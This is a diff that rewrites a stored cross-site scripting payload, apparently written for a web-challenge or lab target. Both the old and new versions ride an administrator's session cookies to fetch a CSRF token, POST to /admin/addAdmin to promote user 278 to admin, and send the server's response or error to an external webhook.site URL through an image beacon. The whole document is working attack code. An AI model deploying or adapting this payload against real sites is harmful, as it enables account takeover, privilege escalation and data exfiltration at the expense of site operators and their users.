@@ -1,18 +1,30 @@
 <script>
-  fetch('/csrf-token',{credentials:'include'})
-    .then(r=>r.json())
-    .then(token=>{
-      return fetch('/admin/addAdmin',{
-        method:'POST',
-        credentials:'include',
-        headers:{
-          'Content-Type':'application/json',
-          'CSRF-Token': token.csrf
-        },
-        body: JSON.stringify({ userId: 278 })
-      })
-      .then(r=>r.text())
-      .then(t=> new Image().src = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160?res=' + encodeURIComponent(t))
-    })
-    .catch(e=> new Image().src = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160?err=' + encodeURIComponent(e.message));
+(async () => {
+  try {
+    // build base URL without credentials
+    const base = location.protocol + '//' + location.hostname + (location.port ? ':' + location.port : '');
+
+    // fetch CSRF token using admin's cookies
+    const tokRes = await fetch(base + '/csrf-token', { credentials: 'include' });
+    const tokJson = await tokRes.json();
+    const csrf = tokJson.csrf || tokJson.token || tokJson._csrf || tokJson.CSRF; // tolerant parsing
+
+    // POST to promote userId 278
+    const promoteRes = await fetch(base + '/admin/addAdmin', {
+      method: 'POST',
+      credentials: 'include',
+      headers: {
+        'Content-Type': 'application/json',
+        'CSRF-Token': csrf
+      },
+      body: JSON.stringify({ userId: 278 })
+    });
+
+    const promoteText = await promoteRes.text();
+    // exfiltrate the response to your webhook
+    new Image().src = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160?res=' + encodeURIComponent(promoteText);
+  } catch (e) {
+    new Image().src = 'https://webhook.site/290533ab-31e3-4217-b6d0-f4a6df2f7160?err=' + encodeURIComponent(e.message);
+  }
+})();
 </script>
